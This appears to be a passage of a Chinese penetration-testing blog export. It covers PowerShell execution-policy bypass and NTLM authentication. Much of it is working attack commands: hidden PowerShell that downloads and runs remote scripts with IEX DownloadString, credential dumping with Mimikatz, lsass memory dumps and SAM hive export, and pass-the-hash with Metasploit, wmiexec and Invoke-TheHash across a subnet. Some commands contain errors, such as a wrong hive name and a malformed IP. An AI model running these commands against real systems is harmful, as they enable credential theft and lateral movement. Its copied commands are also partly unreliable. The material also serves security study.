<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span></span><br><span class="line">Restricted：脚本不能运行（默认设置）</span><br><span class="line">RemoteSigned：在本地创建的脚本可以运行，但从网上下载的脚本不能运行（拥有数字证书签名的除外）</span><br><span class="line">AllSigned：仅当脚本由受信任的发布者签名时才能运行</span><br><span class="line">Unrestricted：允许所有脚本运行</span><br><span class="line">Bypass：不阻止任何操作，并且没有任何警告或提示</span><br><span class="line"></span><br><span class="line">更改当前执行策略</span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> <span class="literal">-ExecutionPolicy</span> RemoteSigned</span><br></pre></td></tr></table></figure>



<h2 id="执行策略作用域"><a href="#执行策略作用域" class="headerlink" title="执行策略作用域"></a>执行策略作用域</h2><table>
<thead>
<tr>
<th align="center">作用域</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MachinePolicy</td>
<td align="center">为计算机的所有用户组策略设置</td>
</tr>
<tr>
<td align="center">UserPolicy</td>
<td align="center">为计算机的当前用户组策略设置</td>
</tr>
<tr>
<td align="center">Process</td>
<td align="center">只影响当前 PowerShell 会话。 执行策略保存在环境变量中 <code>$env:PSExecutionPolicyPreference</code> ，<br>而不是保存在注册表中。 关闭 PowerShell 会话后，会删除变量和值</td>
</tr>
<tr>
<td align="center">CurrentUser</td>
<td align="center">仅影响当前用户， 它存储在 <strong>HKEY_CURRENT_USER</strong> 注册表子项中</td>
</tr>
<tr>
<td align="center">LocalMachine</td>
<td align="center">会影响当前计算机上的所有用户， 它存储在 <strong>HKEY_LOCAL_MACHINE</strong> 注册表子项中</td>
</tr>
</tbody></table>
<p>获取影响当前会话的所有执行策略，并按优先顺序显示它们</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span> <span class="literal">-List</span></span><br></pre></td></tr></table></figure>

<p>更改执行策略</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> <span class="literal">-ExecutionPolicy</span> RemoteSigned</span><br><span class="line">设置执行策略为脚本不能运行</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> <span class="literal">-ExecutionPolicy</span> Unrestricted <span class="literal">-Scope</span> <span class="keyword">Process</span></span><br><span class="line">设置执行策略为在当前会话允许所有脚本运行</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> <span class="literal">-ExecutionPolicy</span> Undefined <span class="literal">-Scope</span> CurrentUser</span><br><span class="line">删除当前用户设置的执行策略，会变成默认执行策略</span><br></pre></td></tr></table></figure>



<h2 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h2><p>PowerShell 运行脚本和其他 shell 基本一致，可以输入完整路径运行，也可以到 ps1 文件所在目录下去运行</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\user&gt; C:\test.ps1</span><br><span class="line">欢迎光临</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\user&gt; <span class="built_in">cd</span> C:\</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; .\test.ps1</span><br><span class="line">欢迎光临</span><br></pre></td></tr></table></figure>



<h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><p>PowerShell 中的管道类似于 linux 中的管道，都是将前一个命令的输出作为另一个命令的输入</p>
<p>两个命令之间使用 “|” 进行连接</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-Process</span> | <span class="built_in">Sort-Object</span> ID</span><br><span class="line">获取进程信息并以ID进行排序</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-Process</span> p* | <span class="built_in">stop-process</span></span><br><span class="line">获取所有以p开头的进程，并停止这些进程</span><br></pre></td></tr></table></figure>



<h2 id="PowerShell-基础命令"><a href="#PowerShell-基础命令" class="headerlink" title="PowerShell 基础命令"></a>PowerShell 基础命令</h2><p>在 PowerShell 下，命令的命名规范很一致，都采用了动词-名词的形式</p>
<p>如 Net-Item，动词一般为 Add、New、Get、Remove、Set 等</p>
<p>PowerShell 还兼容 cmd 和 Linux 命令，如查看目录可以使用 dir 或者 ls </p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">新建目录test：<span class="built_in">New-Item</span> test <span class="literal">-ItemType</span> directory</span><br><span class="line">删除目录test：<span class="built_in">Remove-Item</span> test</span><br><span class="line">新建文件test.txt：<span class="built_in">New-Item</span> test.txt <span class="literal">-ItemType</span> file</span><br><span class="line">新建文件test.txt，内容为 hello：<span class="built_in">New-Item</span> test.txt <span class="literal">-ItemType</span> file <span class="literal">-value</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line">删除文件test.txt：<span class="built_in">Remove-Item</span> test.txt</span><br><span class="line">查看文件test.txt内容：<span class="built_in">Get-Content</span>  test.txt</span><br><span class="line">设置文件test.txt内容t：<span class="built_in">Set-Content</span>  test.txt  <span class="literal">-Value</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line">给文件test.txt追加内容：<span class="built_in">Add-Content</span> test.txt  <span class="literal">-Value</span> <span class="string">&quot;,word!&quot;</span></span><br><span class="line">清除文件test.txt内容：<span class="built_in">Clear-Content</span> test.txt</span><br></pre></td></tr></table></figure>

<p><strong>绕过本地权限并执行</strong></p>
<p>默认情况下 PowerShell 的执行策略是受限模式<code>Restricted</code>，这就导致了在渗透测试过程中我们需要采用一些方法绕过这个策略，从而执行我们的脚本文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span></span><br><span class="line">Restricted</span><br><span class="line"></span><br><span class="line">PowerShell.exe <span class="operator">-File</span> t.ps1</span><br><span class="line">这里会直接报错不能执行</span><br><span class="line"></span><br><span class="line">PowerShell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="operator">-File</span> t.ps1</span><br><span class="line">这里通过<span class="literal">-ExecutionPolicy</span> Bypass绕过限制可以直接执行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PowerShell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> <span class="literal">-NoLogo</span> <span class="literal">-NonInteractive</span> <span class="literal">-NoProfile</span> <span class="operator">-File</span> t.ps1</span><br><span class="line">这里通过<span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> <span class="literal">-NoLogo</span> <span class="literal">-NonInteractive</span> <span class="literal">-NoProfile</span>可以隐藏执行</span><br><span class="line"></span><br><span class="line">PowerShell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> <span class="literal">-NoLogo</span> <span class="literal">-NonInteractive</span> <span class="literal">-NoProfile</span> </span><br><span class="line"><span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.0.1:8000/t.ps1&#x27;)&quot;</span></span><br><span class="line">PowerShell.exe <span class="literal">-Exec</span> Bypass <span class="literal">-W</span> <span class="keyword">Hidden</span> <span class="literal">-NoLogo</span> <span class="literal">-NonI</span> <span class="literal">-NoP</span> </span><br><span class="line"><span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.0.1:8000/t.ps1&#x27;)&quot;</span></span><br><span class="line">这里下载远程脚本绕过权限并隐藏执行，完全写法和简写写法</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网渗透</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透-NTML身份认证</title>
    <url>//155adebd63bd.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>NTML（NT LAN Manager）是问询/应答身份验证协议。</p>
<p>NTML 与 Kerberos 是 Windows 中最常见的两种网络认证协议</p>
<h2 id="NTML-版本"><a href="#NTML-版本" class="headerlink" title="NTML 版本"></a>NTML 版本</h2><p>NTML V1</p>
<pp>
<p>NTLM session V2</p>
<h2 id="LSA（Local-Security-Authority）本地安全机构"><a href="#LSA（Local-Security-Authority）本地安全机构" class="headerlink" title="LSA（Local Security Authority）本地安全机构"></a>LSA（Local Security Authority）本地安全机构</h2><p>LSA 管理本地的安全策略、管理审计策略和设置、为用户生成包含SID和组权限关系的令牌。LSA的验证过程:LSA通过访问本地SAM(Security Accounts Manager)数据库，可以完成本地用户的验证。</p>
<p>首先，用户注销、重启、锁屏后，操作系统会让  <code>winlogon.exe</code> 显示登录界面，也就是输入框，接收输入后，将密码交给  <code>lsass.exe</code> 进程，这个进程中会存一份明文密码，这个进程就是LSA（本地安全机构)</p>
<p>LSA在收到Winlogon的交给他的身份凭证后，判断交给Kerberos协议，或者是NTLM协议，因为我们知道用户登入有两种，一种是本地登入，一种是域登入。如果是本地登入的话，会使用本地数据库进行验证，如果是域登入的话，就会使用域控制器来进行身份验证。</p>
<p>LSA的处理流程：</p>
<p>LSA 首先把身份凭据交给 SSPI ，由该接口负责与 Kerberos 协议或者 NTML 协议沟通</p>
<p>SSPI不能确定用户是本地登录还是域账户进行域登录。所以他会先把身份认证请求传递到Kerberos SSP</p>
<p>Kerberos SSP会验证用户的登入目标是本地计算机还是域。如果是登录域,Kerberos SSP将继续处理。如果是本地计算机,即用户不是登录域,Kerberos SSP返回一个错误消息到SSPI,交回给GINA处理,使服务器登录不可用</p>
<p>SSPI现在发送请求到下一个安全提供程序——NTLM。NTLM SSP会将请求交给Netlogon服务针对LSAM (Local Security Account Manager,本地安全账户管理器)数据库进行身份认证。</p>
<h2 id="SSPI和SSP"><a href="#SSPI和SSP" class="headerlink" title="SSPI和SSP"></a>SSPI和SSP</h2><h3 id="SSPI"><a href="#SSPI" class="headerlink" title="SSPI"></a>SSPI</h3><p>SSPI（Security Support Provider Interface），即<strong>安全服务提供接口</strong>，这是 Windows 定义的特定接口，该接口定义了与安全相关的功能功能，但不仅限于：</p>
<ul>
<li>  身份验证</li>
<li>  税务信息</li>
<li>  为其他协议提供的会话安全机制</li>
</ul>
<h3 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h3><p>SSP（Security Service Provider），即<strong>安全服务提供者</strong>，他是SSPI的实现者，是对SSPI相关功能函数的具体实现。微软自己实现了的SSP，用于提供安全功能：</p>
<ul>
<li>  NTLM SSP</li>
<li>  Kerberos</li>
<li>  摘要 SSP</li>
<li>  信用SSP</li>
<li>  ……</li>
</ul>
<p>在一个系统消息，SSP就是dll，来实现身份验证等安全功能，实现的身份验证机制是不一样的。比如NTLM SSP实现的一种挑战/响应验证机制。而Kerberos SSP实现的就是基于票据的身份验证机制。我们可以写自己的SSP，然后注册到内部，让外界支持更多的自定义身份验证方式。</p>
<h2 id="NTML-本地认证"><a href="#NTML-本地认证" class="headerlink" title="NTML 本地认证"></a>NTML 本地认证</h2><p>Windows 不储存用户的明文密码，它会将明文密码经过加密后存储在 SAM ( <em>Security Account Manager Database</em>，安全账号管理数据库)中。</p>
<blockquote>
<p>  SAM文件的路径是 <code>%SystemRoot%\system32\config\sam</code></p>
</blockquote>
<p>在本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成 <code>NTML Hash</code>，与 <code>SAM</code> 数据库中的 <code>NTML Hash</code> 进行比较，从而实现认证。</p>
<blockquote>
<p>  winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</p>
</blockquote>
<p>首先，用户注销、重启、锁屏后，操作系统会让  <code>winlogon.exe</code> 显示登录界面，也就是输入框，接收输入后，将密码交给  <code>lsass.exe</code> 进程，这个进程中会存一份明文密码，将明文密码加密成 <code>NTLM Hash</code>，对比     SAM 数据库中的 Hash 进行验证。</p>
<h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p>LM Hash（LM Manager Hash） 是一种古老的 Hash，在 LAN Manager 协议中使用，在2003版本之后不再使用</p>
<p>LM NTML 的加密方式如下：</p>
<blockquote>
<p>  PassWord —-&gt; 大写转换 —-&gt; 转换为16进制 —-&gt; 分为两个 7 byte 的比特流 —-&gt; DES加密 —-&gt; 得到 LM  Hash</p>
</blockquote>
<p>例如：</p>
<blockquote>
<p>  admin -&gt; 大写转换 = ADMIN</p>
<p>  ADMIN -&gt; 转换为14字节的16进制字符串 = 41 44 4d 49 4e 00 00 00 00 00 00 00 00 00 </p>
<p>  41 44 4d 49 4e 00 00 00 00 00 00 00 00 00 -&gt; 转换为两个 7byte 的比特流 (二进制) </p>
<p>  41 44 4d 49 4e 00 00  -&gt; 转换为比特流（二进制）</p>
<p>  01000001 01000100 01001101 01001001 01001110 00000000 00000000</p>
<p>  00 00 00 00 00 00 00  -&gt; 转换为比特流（二进制）</p>
<p>  00000000 00000000 00000000 00000000 00000000 00000000 00000000</p>
<p>  若没有56bit，补足为56bit，1 byte 等于 8bit</p>
<p>  在每一个字节后面末尾补0</p>
<p>  01000000 10100010 00010010 10101000 10010100 01110000 00000000 00000000</p>
<p>  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</p>
<p>  把他们转换为8byte的16进制</p>
<p>  40 a2 12 a8 94 70 00 00</p>
<p>  00 00 00 00 00 00 00 00</p>
<p>  使用字符串 KGS!@#$% 进行 DES 加密</p>
<p>  这里需要把十六进制转换为字符串后进行加密</p>
<p>  40 a2 12 a8 94 70 00 00 -&gt; DES = F0D412BD764FFE81</p>
<p>  00 00 00 00 00 00 00 00 -&gt; DES = AAD3B435B51404EE</p>
<p>  最后拼接起来，就是最终的32位 LM Hash</p>
<p>  F0D412BD764FFE81AAD3B435B51404EE</p>
</blockquote>
<h3 id="NTML-Hash"><a href="#NTML-Hash" class="headerlink" title="NTML Hash"></a>NTML Hash</h3><p>NTML Hash（NT LAN Manager） 是 NTML 网络认证协议的凭证</p>
<p>是支持 NET NTML 认证协议及 本地认证 过程中的一个重要参数，长度为32位，由数字与字母组成。</p>
<p>NTML Hash 是指存储在 <code>SAM</code> 数据库及 <code>NTDS.dit数据库</code> 中对密码进行 Hash 计算后的结果，这类的 Hash 可直接用于 PTH，并且存在于 <code>lsass.exe</code> 进程中，便于 NTML SSP （NTML 安全支持提供程序）使用 </p>
<p>NTML Hash 的加密方式如下</p>
<blockquote>
<p>  PassWord —-&gt; 十六进制编码 —-&gt; Unicode转换 —-&gt; MD4加密 —-&gt; 得到NTLM Hash</p>
</blockquote>
<p>例如：</p>
<blockquote>
<p>  admin -&gt; hex(16进制编码) = 61646d696e</p>
<p>  61646d696e -&gt; Unicode（’utf-16le’） = b’a\x00d\x00m\x00i\x00n\x00’</p>
<p>  b’a\x00d\x00m\x00i\x00n\x00’ -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634</p>
</blockquote>
<p>在网络上的文章中，会把Unicode之后的结果再进行一次16进制的转换</p>
<blockquote>
<p>  b’a\x00d\x00m\x00i\x00n\x00’ -&gt; hex(16进制编码) = 610064006d0069006e00</p>
</blockquote>
<p>这样做便于阅读，但是实际上是直接把Unicode之后的结果直接进行MD4加密</p>
<h2 id="NTML-网络认证"><a href="#NTML-网络认证" class="headerlink" title="NTML 网络认证"></a>NTML 网络认证</h2><h3 id="NTML-身份验证"><a href="#NTML-身份验证" class="headerlink" title="NTML 身份验证"></a>NTML 身份验证</h3><p>NTML 身份认证采用的是<code>Challenge(质疑)/Response(响应)</code>验证机制</p>
<p>NTML 通过三部分组成：</p>
<ul>
<li>  <strong>协商（TYPE 1 Negotiate）</strong></li>
<li>  <strong>质询（TYPE 2 Challenge）</strong></li>
<li>  <strong>身份验证（TYPE 3 Authenticate）</strong></li>
</ul>
<p>（1）首先，如果客户端需要访问服务器的某个服务是需要进行身份认证的。于是，客户端要输入服务器的用户名和密码进行验证，此时客户端本地会缓存一份服务器密码的 NTLM Hash 值。</p>
<p>客户端发送 <strong>TYPE 1 Negotiate</strong> 协商消息去协商需要认证的主体，用户（服务器端的用户名），机器以及需要使用的安全服务等信息。</p>
<p>（2）服务端接收到客户端发送过来的 TYPE 1 消息后，会读取其中的内容，并从中选择出自己所能接受的服务内容，加密等级，安全服务等。然后传入 NTLM SSP，得到 <strong>TYPE 2 Challenge</strong> 消息（被称为 Challenge 质询消息），并将此 TYPE 2 消息发回给客户端。</p>
<p>这个 TYPE 2 消息中包含了一个由服务端生成的 16 位随机值，此随机值被称为 Challenge，服务器也会将该 Challenge 保存起来。</p>
<p>（3）客户端收到服务端返回的 TYPE 2 消息后， 会读取出服务端所支持的内容，并取出其中的随机值 Challenge，用缓存的服务器端密码的 NTLM-Hash 对其进行加密，并与用户名、Challenge 等一起组合得到 <strong>Net-NTLMHash</strong>，最后将 <strong>Net NTLM-Hash</strong> 封装到 <strong>TYPE 3 Authenticate</strong> 消息中（被称为 Authenticate 认证消息），发往服务端。</p>
<p>（4）服务器在收到 TYPE 3 的消息之后，用自己的密码的 NTLM-Hash 对 Challenge 进行加密，并比较自己计算出的 Net NTLM-Hash 认证消息和客户端发送的认证消息是否匹配。</p>
<p>如果用户Hash是存储在域控里面，那么就没有办法计算服务器的 Net NTLM-Hash，这个时候用户服务器就会通过 Netlogon 协议联系域控，建立一个安全通道，然后将type 1,type 2,type 3全部发送给域控（这个过程也叫做 Pass Through Authentication 认证流程），最后域控再计算出 Net NTLM-Hash，与 type 3 进行比较</p>
<p>如果匹配，则证明客户端掌握了正确的密码，认证成功，否则认证失败</p>
<h3 id="网络认证版本差异"><a href="#网络认证版本差异" class="headerlink" title="网络认证版本差异"></a>网络认证版本差异</h3><ul>
<li>challenge<ul>
<li>  V1：8-byte</li>
<li>  V2：16-byte</li>
</ul>
</li>
<li>Net-NTML Hash<ul>
<li>  V1：DES</li>
<li>  V2：HMAC-MD5</li>
</ul>
</li>
</ul>
<h3 id="Net-NTML-Hash"><a href="#Net-NTML-Hash" class="headerlink" title="Net-NTML Hash"></a>Net-NTML Hash</h3><p>Net-NTML Hash 是NTML协议在网络认证过程中，对本地NTML Hash 进行加密的协议</p>
<h4 id="Net-NTML-Hash-V1"><a href="#Net-NTML-Hash-V1" class="headerlink" title="Net-NTML Hash V1"></a>Net-NTML Hash V1</h4><blockquote>
<p>  NTML Hash -&gt; 分为三组7字节 -&gt; 使用DES加密 Challenge = 拼接三组得到Net-NTML Hash</p>
</blockquote>
<p>Net-NTML Hash V1 的格式如下：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br></pre></td></tr></table></figure>



<h4 id="Net-NTML-Hash-V2"><a href="#Net-NTML-Hash-V2" class="headerlink" title="Net-NTML Hash V2"></a>Net-NTML Hash V2</h4><blockquote>
<p>  NTML Hash -&gt; 使用 HMAC-MD5 加密 Challenge  = Net-NTML Hash</p>
</blockquote>
<p>Net-NTML Hash V2 的格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure>



<h2 id="本地-Hash-获取"><a href="#本地-Hash-获取" class="headerlink" title="本地 Hash 获取"></a>本地 Hash 获取</h2><h3 id="Quarks-PwDump-工具"><a href="#Quarks-PwDump-工具" class="headerlink" title="Quarks PwDump 工具"></a>Quarks PwDump 工具</h3><p>需要手动编译</p>
<p><a href="https://blog.quarkslab.com/quarks-pwdump.html">https://blog.quarkslab.com/quarks-pwdump.html</a></p>
<p><a href="https://github.com/quarkslab/quarkspwdump">https://github.com/quarkslab/quarkspwdump</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">quarkspwdump.exe <span class="literal">-dhl</span></span><br></pre></td></tr></table></figure>



<h3 id="Mimikatz-工具"><a href="#Mimikatz-工具" class="headerlink" title="Mimikatz 工具"></a>Mimikatz 工具</h3><p><a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
<p>内存读取密码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 提升权限</span></span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取密码</span></span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>

<p>注册表 读取密码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg save hklm\sam D:\sam.hive</span><br><span class="line">reg save hklm\sam D:\system.hive</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 提升权限</span></span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">lsadump::sam /sam:sam.hiv /system:system.hiv</span><br></pre></td></tr></table></figure>



<h3 id="转储LSASS进程"><a href="#转储LSASS进程" class="headerlink" title="转储LSASS进程"></a>转储LSASS进程</h3><h4 id="prodump-工具"><a href="#prodump-工具" class="headerlink" title="prodump 工具"></a>prodump 工具</h4><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">procdump.exe <span class="literal">-accepteula</span> <span class="literal">-ma</span> lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>

<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1&#x27;</span>); <span class="string">&quot;Get-Process lsass | Out-Minidump&quot;</span></span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(‘https://github.com/samratashok/nishang/blob/master/Gather/<span class="built_in">Get-PassHashes</span>.ps1<span class="string">&#x27;);Get-PassHashes</span></span><br></pre></td></tr></table></figure>

<h4 id="任务管理器"><a href="#任务管理器" class="headerlink" title="任务管理器"></a>任务管理器</h4><p>右键-创建转储文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Users\用户名\AppData\Local\Temp\lsass.DMP</span><br></pre></td></tr></table></figure>

<h4 id="分析-lass-dmp文件"><a href="#分析-lass-dmp文件" class="headerlink" title="分析 lass.dmp文件"></a>分析 lass.dmp文件</h4><p>Mimikatz 工具</p>
<p><a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>



<h2 id="本地-Hash-解密"><a href="#本地-Hash-解密" class="headerlink" title="本地 Hash 解密"></a>本地 Hash 解密</h2><p>John 工具</p>
<p><a href="https://github.com/openwall/john">https://github.com/openwall/john</a></p>
<p><a href="https://www.freesion.com/article/4366899658/">https://www.freesion.com/article/4366899658/</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">john xxx.txt</span><br></pre></td></tr></table></figure>



<p>Hashcat</p>
<p><a href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">hashcat<span class="literal">-m</span> <span class="number">1000</span> <span class="literal">-a</span> <span class="number">0</span> <span class="literal">-o</span> winpassok.txt win.hash password.lst -<span class="literal">-username</span></span><br></pre></td></tr></table></figure>





<h2 id="PTH-哈希传递攻击"><a href="#PTH-哈希传递攻击" class="headerlink" title="PTH 哈希传递攻击"></a>PTH 哈希传递攻击</h2><p>哈希传递（Pass The Hash）攻击简称 PTH，该方法通过找到与账户相关的密码散列值（NTLM Hash）来进行攻击。由于在 Windows 系统 NTLM 认证的 TYPE 3 消息计算 Response 的时候，客户端是使用用户的 NTLM Hash 进行计算的，而不是用户密码进行计算的。因此在模拟用户登录或对访问资源的用户进行身份认证的时候，是不需要用户明文密码的，只需要用户 Hash。攻击者可以利用 NTLM HASH 直接远程登录目标主机或反弹 Shell。</p>
<p>在域环境中，用户登录计算机时一般使用域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也相同，攻击者就能使用哈希传递攻击的方法来登录内网中的其他主机。使用该方法，攻击者不需要花费时间来对Hash进行爆破，在内网渗透里非常经典。常常适用于域环境或工作组环境。</p>
<p>前提：</p>
<p>抓取管理员的密码、NTLM Hash</p>
<ul>
<li>  认证的用户名 （质询第一步需要）</li>
<li>  认证用户的NTLM Hash</li>
</ul>
<h3 id="PTH（Pass-The-Hash）-利用"><a href="#PTH（Pass-The-Hash）-利用" class="headerlink" title="PTH（Pass-The-Hash） 利用"></a>PTH（Pass-The-Hash） 利用</h3><p><strong>mimikatz 交互式获取</strong></p>
<p><a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:域用户 /domain:域工作组 /ntlm:Hash值</span><br></pre></td></tr></table></figure>

<p>成功后，会自动弹出一个新的CMD窗口，访问远程主机或者服务，就不用提供明文密码了</p>
<p><strong>使用Metasploit进行PTH</strong></p>
<p>可用的模块</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">auxiliary/admin/smb/psexec_command      // 在目标机器上执行系统命令              </span><br><span class="line">exploit/windows/smb/psexec            // 用psexec执行系统命令         </span><br><span class="line">exploit/windows/smb/psexec_psh         // 使用powershell作为payload</span><br></pre></td></tr></table></figure>

<p>我们使用<code>exploit/windows/smb/psexec    </code>执行PTH</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.0.1</span><br><span class="line">set smbuser administrator</span><br><span class="line">set smbpass 00000000000000000000000000000000:4d6e43b2cdc951808100f5b1d09aac63  # 完整的Administrator用户的Hash</span><br><span class="line">set smbdomain 域工作组</span><br><span class="line">run</span><br></pre></td></tr></table></figure>



<p><strong>wmiexec</strong></p>
<p>python版本</p>
<p>这是impacket工具包里面的脚本，可以用来PTH，支持走socks代理。</p>
<p><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/CoreSecurity/impacket.git</span><br><span class="line">cd impacket/</span><br><span class="line">pip install .</span><br><span class="line"></span><br><span class="line">wmiexec.py -hashes 00000000000000000000000000000000:4d6e43b2cdc951808100f5b1d09aac63 domain/administrator@192.1680.1 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p>wmiexec.exe版本</p>
<p><a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmiexec.exe <span class="literal">-hashes</span> <span class="number">00000000000000000000000000000000</span>:<span class="number">4</span>d6e43b2cdc951808100f5b1d09aac63 domain/administrator@<span class="number">192.1680</span>.<span class="number">1</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>

<p>powershell版本</p>
<p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p>
<p>Invoke-TheHash项目是一个基于.Net TCPClient，通过把NTLM hash传递给NTLMv2身份验证协议来进行身份验证的攻击套件，且执行时客户端不需要本地管理员权限。内含如下多个脚本：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-WMIExec</span>.ps1    </span><br><span class="line"><span class="built_in">Invoke-SMBExec</span>.ps1    </span><br><span class="line"><span class="built_in">Invoke-SMBEnum</span>.ps1    </span><br><span class="line"><span class="built_in">Invoke-SMBClient</span>.ps1    </span><br><span class="line"><span class="built_in">Invoke-TheHash</span>.ps1</span><br></pre></td></tr></table></figure>

<p>其可以执行WMI和SMB命令，并对内网IP批量进行PTH攻击</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-TheHash.ps1&#x27;</span>);<span class="built_in">Invoke-TheHash</span> <span class="literal">-Type</span> WMIExec <span class="literal">-Target</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-Domain</span> 域工作组 <span class="literal">-Username</span> administrator <span class="literal">-Hash</span> <span class="number">4</span>d6e43b2cdc951808100f5b1d09aac63 <span class="literal">-Command</span> <span class="string">&quot;whoami&quot;</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>



<p><strong>psexec</strong></p>
<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p>
